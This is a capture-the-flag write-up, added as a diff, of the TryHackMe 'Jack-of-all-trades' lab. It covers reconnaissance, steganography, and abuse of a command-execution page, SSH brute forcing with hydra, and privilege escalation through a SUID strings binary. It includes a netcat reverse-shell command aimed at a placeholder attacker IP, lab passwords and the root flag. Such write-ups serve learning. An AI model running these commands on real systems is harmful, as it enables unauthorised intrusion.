@@ -1,0 +1,184 @@
+=============:\\\\\\\\
+RECONAISSANCE:-------->>
+=============:////////
+
+Initial reconnaissance of the target website resulted in the connection being reset. Manual browsing attempts failed, indicating that
+the service was not hosted on a standard web port. Further investigation was required to identify exposed services.
+
+When attempting to access the target via Firefox, the following restriction was observed:
+
+This address is restricted
+This address uses a network port which is normally used for purposes other than Web browsing.
+Firefox has canceled the request for your protection.
+
+This indicated that the website was hosted on port 22, which is normally reserved for SSH. Since Firefox blocks access to restricted ports
+by default, alternative methods were required to continue reconnaissance.
+
+CURL Enumeration
+
+Using curl allowed interaction with the HTTP service running on port 22:
+
+curl http://10.81.148.153:22
+
+The response revealed a fully rendered HTML page titled “Jack‑of‑all‑trades!”, along with several images and developer comments
+embedded in the source code. Two notable comments were identified:
+
+A recovery endpoint:
+
+<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
+
+A Base64‑encoded string:
+
+UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
+
+Decoding this string revealed:
+
+Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
+
+This password became relevant later during steganographic analysis.
+
+
+
+=============:\\\\\
+ENUMERATION:------------->>
+=============://////////
+
+An Nmap scan was performed to enumerate services:
+
+nmap -sC -sV -O -T4 -Pn -p- 10.81.148.153
+
+Results showed:
+
+Port 22 running an HTTP service (Apache 2.4.10)
+
+Port 80 running SSH (OpenSSH 6.7p1)
+
+This non‑standard service configuration explained earlier connection issues and influenced exploitation strategy.
+
+
+An investigation was then launched into the assets that we had discovered during the reconnaissance stage.
+
+==========================
+assets/stego.jpg
+
+The file was downloaded and analyzed using steghide:
+
+steghide extract -sf stego.jpg
+
+This produced a file named creds.txt, containing the message:
+
+Hehe. Gotcha!
+You're on the right path, but wrong image!
+
+This confirmed that steganography was in use, but the incorrect image had been targeted. The previously recovered password u?WtKSraq was confirmed to be valid, but for a different asset.
+
+========================
+assets/jackinthebox.jpg
+
+Attempts to extract data from jackinthebox.jpg using the same password failed. Based on earlier comments in the HTML source, it was assumed that access was restricted and recovery functionality needed to be used.
+
+=============================================
+/recovery.php
+
+The recovery page presented a username and password form. Embedded within the HTML source was a long Base32‑encoded string. Decoding this string produced text that appeared to be encrypted with a ROT cipher.
+
+Applying ROT13 resulted in the following message:
+
+Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
+
+The link redirected to a Wikipedia page on stegosaurs, reinforcing that steganography was still the intended attack vector and that another image on the homepage required investigation.
+
+=================
+assets/header.jpg
+
+Extracting hidden data from header.jpg using steghide successfully produced a file named cms.creds:
+
+Here you go Jack. Good thing you thought ahead!
+Username: jackinthebox
+Password: TplFxiSHjY
+
+This confirmed the existence of a CMS‑style backend.
+
+To access the CMS through Firefox, restricted port access was bypassed by modifying the following setting:
+
+about:config → network.security.ports.banned.override
+
+Port 22 was added to the allowed list.
+
+Accessing the CMS revealed the following endpoint:
+
+http://10.81.148.153:22/nnxhweOV/index.php
+
+The page accepted a cmd GET parameter and executed system commands:
+
+GET me a 'cmd' and I'll run it for you Future-Jack.
+
+Command execution was verified using:
+
+index.php?cmd=ls -a
+
+Source code analysis of index.php confirmed unsanitized command execution gated only by a static cookie value.
+
+=============:\\\\\\
+EXPLOITATION:--------------->>
+=============:////////////
+
+A reverse shell was obtained using the CMS command execution vulnerability:
+
+?cmd=nc -e /bin/sh <attacker_ip> 1234
+
+Once access was established, the file jacks_password_list was discovered and contained a list of potential SSH passwords.
+
+Using hydra, SSH brute forcing was performed against port 80:
+
+hydra -l jack -P sshwords.txt -s 80 ssh://10.81.148.153
+
+Valid credentials were recovered:
+
+Username: jack
+Password: ITMJpGGIqg1jn?>@
+
+SSH access was successfully obtained.
+
+The user flag was located in /home/jack/ as an image file. Due to Python3 not being installed, an alternative file transfer method was required:
+
+python -m SimpleHTTPServer
+
+The file was downloaded via wget, and the flag was extracted from the image.
+
+#It is worth noting that full compromise was also possible without a reverse shell; however,
+command output formatting made the reverse shell approach faster and more efficient.
+
+====================:\\\\
+PRIVILEGE ESCALATION:-------->>>
+====================:///////
+
+SUID binaries were enumerated:
+
+find / -perm -4000 2>/dev/null
+
+The strings binary was identified as SUID‑enabled. Based on a hint in the TryHackMe room, the target file was identified as /root/root.txt.
+
+Executing:
+
+strings /root/root.txt
+
+Revealed the root flag embedded within plaintext task notes:
+
+securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
+
+This completed privilege escalation and full system compromise.
+
+=============:\\\\\\\\\
+POST-EXPLOITATION:-------------->>
+=============://///////////////
+
+All intended flags were successfully retrieved. No persistence mechanisms were deployed.
+
+=============:\\\\\\\\\\\
+REPORTING:-------------------------->>
+=============://///////////////////
+
+The engagement demonstrated multiple critical vulnerabilities including insecure service configuration,
+information disclosure, hard‑coded credentials, command injection, weak credential management, and unsafe SUID binaries.
+When chained together, these flaws allowed full system compromise from unauthenticated access.
